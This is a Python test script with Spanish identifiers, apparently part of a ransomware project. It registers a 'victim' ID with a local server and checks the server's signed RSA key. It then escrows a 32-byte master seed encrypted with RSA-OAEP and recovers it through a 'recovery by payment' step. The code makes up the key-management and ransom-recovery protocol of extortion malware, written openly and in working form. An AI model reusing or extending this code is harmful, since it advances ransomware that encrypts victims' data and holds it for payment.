# scratch_cliente_prueba.py (en la raíz del proyecto)
import socket, base64, secrets
from comun.transporte import enviar_mensaje, recibir_mensaje
from comun.crypto_common import generar_par_rsa, exportar_publica, reconstruir_publica, encapsular_oaep, desencapsular_oaep

from comun.firmas import (
    cargar_clave_publica_pem,
    verificar_firma_clave,
)
from pathlib import Path



ID_VICTIMA = "v-prueba-003"
priv_victima, pub_victima = generar_par_rsa(2048)

conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexion.connect(("127.0.0.1", 5000))

# 1. Registro
enviar_mensaje(conexion, {
    "tipo": "registro", "idV": ID_VICTIMA,
    **{f"pkv_{k}": v for k, v in exportar_publica(pub_victima).items()},
})
respuesta = recibir_mensaje(conexion)
print("Registro:", respuesta)
if not respuesta or respuesta.get("tipo") != "registro_ok":
    conexion.close()
    raise RuntimeError(
        f"No se pudo registrar la víctima: {respuesta}"
    )

pk_servidor = reconstruir_publica({
    "n": respuesta["pks_n"],
    "e": respuesta["pks_e"],
})

# La clave de confianza se obtiene por un canal independiente.
ruta_clave_confianza = (
    Path(__file__).parent
    / "victima"
    / "datos"
    / "clave_firma_publica.pem"
)

clave_confianza = cargar_clave_publica_pem(ruta_clave_confianza)

firma_valida = verificar_firma_clave(
    clave_confianza,
    "servidor",
    ID_VICTIMA,
    pk_servidor,
    respuesta.get("pks_firma"),
)

if not firma_valida:
    conexion.close()
    raise RuntimeError(
        "Firma del servidor inválida. Se cancela el envío de la semilla."
    )

print("Firma del servidor verificada correctamente.")


# 2. Entrega de la semilla maestra (aquí simulada; luego será generar_semilla_maestra())
sV = secrets.token_bytes(32)
encapsulacion = encapsular_oaep(pk_servidor, sV)
enviar_mensaje(conexion, {
    "tipo": "entrega_semilla", "idV": ID_VICTIMA,
    "encapsulacion_b64": base64.b64encode(encapsulacion).decode("ascii"),
})
print("Entrega:", recibir_mensaje(conexion))

# 3. Recuperación por pago
enviar_mensaje(conexion, {"tipo": "recuperar_pago", "idV": ID_VICTIMA})
respuesta = recibir_mensaje(conexion)
encapsulacion_recuperada = base64.b64decode(respuesta["encapsulacion_b64"])
sV_recuperada = desencapsular_oaep(priv_victima, encapsulacion_recuperada)
assert sV_recuperada == sV
print("Recuperación por pago OK — la semilla coincide.")

conexion.close()